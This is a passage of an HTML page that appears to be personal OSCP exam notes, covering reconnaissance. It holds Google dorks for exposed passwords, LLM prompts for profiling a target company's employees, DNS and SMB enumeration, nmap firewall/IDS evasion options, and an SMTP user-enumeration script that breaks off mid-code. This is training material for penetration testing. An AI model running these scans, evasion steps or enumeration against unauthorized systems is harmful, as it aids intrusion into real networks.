    <span class="md-ellipsis">
      
        Golden Ticket
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shadow-copies" class="md-nav__link">
    <span class="md-ellipsis">
      
        Shadow Copies
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumerating-aws-cloud-infrastructure" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating AWS Cloud Infrastructure
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Enumerating AWS Cloud Infrastructure">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance-of-cloud-resources-on-the-internet" class="md-nav__link">
    <span class="md-ellipsis">
      
        Reconnaissance of Cloud Resources on the Internet
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance of Cloud Resources on the Internet">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-and-subdomain-reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      
        Domain and Subdomain Reconnaissance
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#service-specific-domains" class="md-nav__link">
    <span class="md-ellipsis">
      
        Service-specific Domains
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reconnaissance-via-cloud-service-providers-api" class="md-nav__link">
    <span class="md-ellipsis">
      
        Reconnaissance via Cloud Service Provider's API
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance via Cloud Service Provider&#39;s API">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#configure-aws-cli" class="md-nav__link">
    <span class="md-ellipsis">
      
        Configure AWS CLI
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#publicly-shared-resources" class="md-nav__link">
    <span class="md-ellipsis">
      
        Publicly Shared Resources
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#obtaining-account-ids-from-s3-buckets" class="md-nav__link">
    <span class="md-ellipsis">
      
        Obtaining Account IDs from S3 Buckets
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-iam-users-in-other-accounts" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating IAM Users in Other Accounts
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#initial-iam-reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      
        Initial IAM Reconnaissance
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Initial IAM Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#examining-compromised-credentials" class="md-nav__link">
    <span class="md-ellipsis">
      
        Examining Compromised Credentials
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#scoping-iam-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      
        Scoping IAM permissions
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#iam-resources-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        IAM Resources Enumeration
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="IAM Resources Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-iam-resources" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating IAM Resources
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#processing-api-response-data-with-jmespath" class="md-nav__link">
    <span class="md-ellipsis">
      
        Processing API Response data with JMESPath
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#running-automated-enumeration-with-pacu" class="md-nav__link">
    <span class="md-ellipsis">
      
        Running Automated Enumeration with Pacu
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extracting-insights-from-enumeration-data" class="md-nav__link">
    <span class="md-ellipsis">
      
        Extracting Insights from Enumeration Data
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
                



  


  <nav class="md-path" aria-label="Navigation" >
    <ol class="md-path__list">
      
        
  
  
    <li class="md-path__item">
      <a href="../.." class="md-path__link">
        
  <span class="md-ellipsis">
    Notes of Ertaoz Bregvadze
  </span>

      </a>
    </li>
  

      
      
        
  
  
    
    
      <li class="md-path__item">
        <a href="./" class="md-path__link">
          
  <span class="md-ellipsis">
    OSCP Materials
  </span>

        </a>
      </li>
    
  

      
    </ol>
  </nav>

              
              <article class="md-content__inner md-typeset">
                
                  



<h1 id="oscp-cheatsheet">OSCP CheatSheet</h1>
<h2 id="information-gathering"><strong>Information gathering</strong></h2>
<h3 id="passive-information-gathering"><strong>Passive Information Gathering</strong></h3>
<h4 id="passive-enumeration">Passive Enumeration</h4>
<p><strong>Whois</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>whois<span class="w"> </span>domain.com
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>whois<span class="w"> </span>&lt;IP&gt;<span class="w">       </span><span class="c1"># Reverse lookup</span>
</span></code></pre></div>
<p><strong>theHarvester</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>theHarvester<span class="w"> </span>-d<span class="w">  </span>domain.com<span class="w"> </span>-l<span class="w"> </span><span class="m">100</span><span class="w"> </span>-b<span class="w"> </span>google
</span></code></pre></div>
<p><strong>Google Dork</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>site:<span class="o">[</span>website<span class="o">]</span><span class="w"> </span>filetype:<span class="o">[</span>filetype<span class="o">]</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>site:<span class="o">[</span>website<span class="o">]</span><span class="w"> </span>-filetype:<span class="o">[</span>filetype<span class="o">]</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>cache:<span class="o">[</span>URL<span class="o">]</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>intitle:<span class="s2">&quot;index of&quot;</span><span class="w"> </span><span class="s2">&quot;parent directory&quot;</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>intext:<span class="s2">&quot;domain.com&quot;</span><span class="w"> </span><span class="s2">&quot;passwords&quot;</span>
</span></code></pre></div>
<p><strong>Open-Source Code</strong></p>
<p><em>Github Search - owner:domain</em></p>
<p><a href="https://github.com/gitleaks/gitleaks">Gitleaks</a></p>
<p><strong>Tools :</strong></p>
<ul>
<li><a href="https://www.shodan.io/">Shodan</a></li>
<li><a href="https://exploits.shodan.io/">Exploits Shodan</a></li>
<li><a href="https://www.maltego.com">Maltego</a></li>
<li><a href="https://dnsdumpster.com">DNSdumpster</a></li>
<li><a href="https://searchdns.netcraft.com">Netcraft</a></li>
<li><a href="https://securityheaders.com/">SecurityHeaders</a></li>
<li><a href="https://www.ssllabs.com/ssltest/">SSLTest</a></li>
<li><a href="https://dorksearch.com/">GoogleDork</a></li>
</ul>
<hr />
<h3 id="llm-powered-passive-information-gathering"><strong>LLM-Powered Passive Information Gathering</strong></h3>
<h4 id="passive-llm-aided-enumeration"><strong>Passive LLM-Aided enumeration</strong></h4>
<p><em>prompts:</em></p>
<ul>
<li><code>whois megacorpone.com</code></li>
<li><code>Can you print out all the public information about company structure and employees of megacorpone?</code></li>
<li><code>can you provide the best 20 google dorks for megacorpone.com website tailored for a penetration test?</code></li>
<li><code>Retrieve the technology stack of the megacorpone.com website</code></li>
<li><code></code></li>
</ul>
<hr />
<h3 id="active-information-gathering"><strong>Active Information Gathering</strong></h3>
<p><em>Living off the Land</em> pre installed and trusted Windows binaries.  </p>
<p><a href="https://lolbas-project.github.io/">LOLBAS</a></p>
<blockquote>
<p>Each domain can use different types of DNS records. Some of the most
common types of DNS records include:</p>
<ul>
<li><strong>NS</strong>: Nameserver records contain the name of the authoritative
servers hosting the DNS records for a domain.</li>
<li><strong>A</strong>: Also known as a host record, the "<em>a record</em>" contains the IPv4
address of a hostname (such as www.megacorpone.com).</li>
<li><strong>AAAA</strong>: Also known as a quad A host record, the "<em>aaaa record</em>"
contains the IPv6 address of a hostname (such as www.megacorpone.com).</li>
<li><strong>MX</strong>: Mail Exchange records contain the names of the servers
responsible for handling email for the domain. A domain can contain
multiple MX records.</li>
<li><strong>PTR</strong>: Pointer Records are used in reverse lookup zones and can
find the records associated with an IP address.</li>
<li>
<p><strong>CNAME</strong>: Canonical Name Records are used to create aliases for
other host records.</p>
</li>
<li>
<p><strong>TXT</strong>: Text records can contain any arbitrary data and be used
for various purposes, such as domain ownership verification.</p>
</li>
</ul>
</blockquote>
<p><strong>Host / Dig</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>host<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>host<span class="w"> </span>-t<span class="w"> </span>NS<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>host<span class="w"> </span>-t<span class="w"> </span>MX<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>host<span class="w"> </span>-t<span class="w"> </span>TXT<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>host<span class="w"> </span>-t<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>IP<span class="o">]</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="k">for</span><span class="w"> </span>ip<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>list.txt<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>host<span class="w"> </span><span class="nv">$ip</span>.domain.com<span class="p">;</span><span class="w"> </span><span class="k">done</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="k">for</span><span class="w"> </span>ip<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="m">254</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>host<span class="w"> </span><span class="m">10</span>.10.10.<span class="nv">$ip</span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;not found&quot;</span>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>---------------------------------------------------------------------------------
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>dig<span class="w"> </span>any<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span>
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>dig<span class="w"> </span>any<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span><span class="w"> </span>@<span class="o">[</span>DNSIP<span class="o">]</span>
</span></code></pre></div>
<p><strong>DNS Enumeration Tools</strong></p>
<ul>
<li><em>Dnsrecon</em><ul>
<li><code>dnsrecon -d [domain] -n [DNS IP]</code></li>
<li><code>dnsrecon -d [domain] -n [DNS IP] -t std</code></li>
<li><code>dnsrecon -d [domain] -D ~/list.txt -t brt</code></li>
</ul>
</li>
<li><em>Dnsenum</em><ul>
<li><code>dnsenum [domain]</code></li>
<li><code>dnsenum [domain] --dnsserver [DNS IP]</code></li>
<li><code>dnsrecon -d [domain] -D ~/list.txt -t brt</code></li>
</ul>
</li>
<li><em>Fierce</em><ul>
<li><code>fierce --domain [domain]</code></li>
<li><code>fierce --domain [domain] --dns-servers [DNS IP]</code></li>
<li><code>fierce --domain [domain] --dns-servers {IP}</code></li>
</ul>
</li>
<li>N<em>SLookup - Living off the Land</em><ul>
<li><code>nslookup [domain]</code></li>
<li><code>nslookup -type=[type] [domain]</code></li>
<li><code>nslookup -type=any [domain] [DNS IP]</code></li>
</ul>
</li>
</ul>
<h4 id="port-scanning-with-nmap">Port Scanning with Nmap</h4>
<p><strong><em>Host Discovery:</em></strong></p>
<ul>
<li><code>nmap -sn [netblock]</code></li>
<li><code>fping -asgq [netblock]</code></li>
</ul>
<p><strong><em>Scanning techniques:</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nmap<span class="w"> </span>-sS<span class="w"> </span>target<span class="w">                         </span><span class="c1"># SYN/Stealth scan</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>nmap<span class="w"> </span>-sA<span class="w"> </span>target<span class="w">                         </span><span class="c1"># ACK scan</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>nmap<span class="w"> </span>-sF<span class="w"> </span>target<span class="w">                         </span><span class="c1"># FIN scan</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>nmap<span class="w"> </span>-sN<span class="w"> </span>target<span class="w">                         </span><span class="c1"># Null scan</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>nmap<span class="w"> </span>-sO<span class="w"> </span>target<span class="w">                         </span><span class="c1"># IP Protocol scan</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>nmap<span class="w"> </span>-sX<span class="w"> </span>target<span class="w">                         </span><span class="c1"># XMAS scan</span>
</span></code></pre></div>
<p><strong><em>Idle/Zombie scan:</em></strong></p>
<ul>
<li><code>nmap -O -v -n [targetZombie]</code></li>
<li><code>nmap --script ipidsec [targetZombie]</code></li>
<li><code>nmap -Pn -sI [targetZombie]:[port] [target] -p [port] -v</code></li>
</ul>
<p><strong><em>FTP bounce scan :</em></strong></p>
<ul>
<li><code>nmap -Pn -b [vulnerableFTP] [target]</code></li>
</ul>
<p><strong><em>Service and OS detection:</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nc<span class="w"> </span><span class="o">[</span>targetIP<span class="o">]</span>:<span class="o">[</span>Port<span class="o">]</span><span class="w">                      </span><span class="c1"># Banner Grabbing</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>nmap<span class="w"> </span>-sV<span class="w"> </span>target<span class="w">                           </span><span class="c1"># Version Scan</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>target<span class="w">                       </span><span class="c1"># Version/Script Scan</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>nmap<span class="w"> </span>-O<span class="w"> </span>target<span class="w">                            </span><span class="c1"># OS Detection</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>nmap<span class="w"> </span>-A<span class="w"> </span>target<span class="w">                            </span><span class="c1"># Version/Script/OS/Traceroute Scan</span>
</span></code></pre></div>
<p><strong><em>Firewall/IDS Evasion:</em></strong></p>
<ul>
<li><em>Fragmentation</em><ul>
<li><code>nmap -sS -f [target]</code></li>
<li><code>nmap -sS -f --data-lenght 100 [target]</code></li>
</ul>
</li>
<li><em>Decoy</em><ul>
<li><code>nmap -sS -D [spoofIP],[spoofIP],ME,[spoofIP] [target]</code></li>
<li><code>nmap -sS -D RND:10 [target]</code></li>
</ul>
</li>
<li><em>Source ports</em><ul>
<li><code>nmap -sS --source-port [source port] [target]</code></li>
</ul>
</li>
<li><em>Packet Header</em><ul>
<li><code>nmap -sS --data-lenght 10 [target]</code></li>
</ul>
</li>
<li><em>Mac address spoofing</em><ul>
<li><code>nmap -sS --spoof-mac [mac] [target]</code></li>
</ul>
</li>
<li><em>Timing</em><ul>
<li><code>nmap -iL [hosts.txt] -sS -T [Timing option]</code></li>
</ul>
</li>
</ul>
<p><strong><em>Living Off the Land</em></strong> </p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">Test-NetConnection</span> <span class="n">-Port</span> <span class="no">[port] [IP]</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">1</span><span class="p">..</span><span class="n">1024</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span><span class="nb">echo </span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TcpClient</span><span class="p">).</span><span class="n">Connect</span><span class="p">(</span><span class="s2">&quot;[IP]&quot;</span><span class="p">,</span> <span class="nv">$_</span><span class="p">))</span> <span class="s2">&quot;TCP port $_ is open&quot;</span><span class="p">}</span> <span class="n">2</span><span class="p">&gt;</span><span class="nv">$null</span>
</span></code></pre></div>
<h4 id="smb-enumeration"><strong>SMB Enumeration</strong></h4>
<p><strong><em>NetBIOS Enumeration:</em></strong></p>
<ul>
<li><em>Windows</em><ul>
<li><code>nbtstat -n</code></li>
<li><code>nbtstat -A &lt;IP&gt;</code></li>
</ul>
</li>
<li><em>Linux</em><ul>
<li><code>nbtscan -v &lt;IP/NETBLOCK&gt;</code></li>
</ul>
</li>
</ul>
<p><strong>SMB Shared Folder Enumeration</strong></p>
<ul>
<li><em>Windows</em><ul>
<li><code>net view \\dc01 /all</code></li>
<li><code>net use K: \\dc01\share</code></li>
</ul>
</li>
<li>Linux<ul>
<li><code>smbclient -N -L &lt;IP&gt;</code></li>
<li><code>impacket-smbcliet &lt;IP&gt;</code></li>
</ul>
</li>
</ul>
<p><strong>Nmap SMB Scripts</strong> - <code>ls -1 /usr/share/nmap/scripts/smb*</code></p>
<h4 id="smtp-enumeration"><strong>SMTP Enumeration</strong></h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c">## Nmap Enumeration</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span> <span class="n">smtp</span><span class="p">-*</span> <span class="p">&lt;</span><span class="n">IP_Address</span><span class="p">&gt;</span> <span class="n">-p25</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c">## Connect to target</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="n">nc</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">25</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="n">telnet</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">25</span>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="c">## Start Communication</span>
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="p">&gt;</span> <span class="n">HELO</span> <span class="n">domain</span><span class="p">.</span><span class="n">com</span>                      
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>
</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="c">## User Enumeeration</span>
</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="p">&gt;</span> <span class="n">MAIL</span> <span class="n">FROM</span><span class="p">:</span> <span class="n">user</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span>
</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="p">&gt;</span> <span class="n">RCPT</span> <span class="n">TO</span><span class="p">:</span> <span class="n">root</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span>              
</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="p">&gt;</span> <span class="n">EXPN</span> <span class="n">root</span>                             
</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="p">&gt;</span> <span class="n">VRFY</span> <span class="n">root</span>                            
</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>
</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="p">$</span> <span class="n">smtp-user-enum</span> <span class="n">-M</span> <span class="n">VRFY</span> <span class="n">-U</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-t</span> <span class="p">&lt;</span><span class="n">IP_Address</span><span class="p">&gt;</span>
</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="p">$</span> <span class="n">smtp-user-enum</span> <span class="n">-M</span> <span class="n">EXPN</span> <span class="n">-U</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-t</span> <span class="p">&lt;</span><span class="n">IP_Address</span><span class="p">&gt;</span>
</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="p">$</span> <span class="n">smtp-user-enum</span> <span class="n">-M</span> <span class="n">RCPT</span> <span class="n">-U</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-t</span> <span class="p">&lt;</span><span class="n">IP_Address</span><span class="p">&gt;</span>
</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a><span class="p">$</span> <span class="n">smtp-user-enum</span> <span class="n">-M</span> <span class="n">VRFY</span> <span class="n">-u</span> <span class="n">root</span> <span class="n">-t</span> <span class="p">&lt;</span><span class="n">IP_Address</span><span class="p">&gt;</span>
</span></code></pre></div>
<p><strong><em>Enable Telnet on Windows</em></strong></p>
<p><code>PS &gt; dism /online /Enable-Feature /FeatureName:TelnetClient</code></p>
<p><strong><em>Python Script</em></strong></p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="ch">#!/usr/bin/python</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Usage: vrfy.py &lt;username&gt; &lt;target_ip&gt;&quot;</span><span class="p">)</span>
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="c1">## Create a Socket</span>
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="c1">## Connect to the Server</span>
</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="n">connect</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="mi">25</span><span class="p">))</span>
</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>
</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="c1">## Receive the banner</span>
</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a><span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>
</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a>
</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a><span class="c1">## VRFY a user</span>
</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a><span class="n">user</span> <span class="o">=</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;VRFY &#39;</span> <span class="o">+</span> <span class="n">user</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a><span class="n">result</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a>
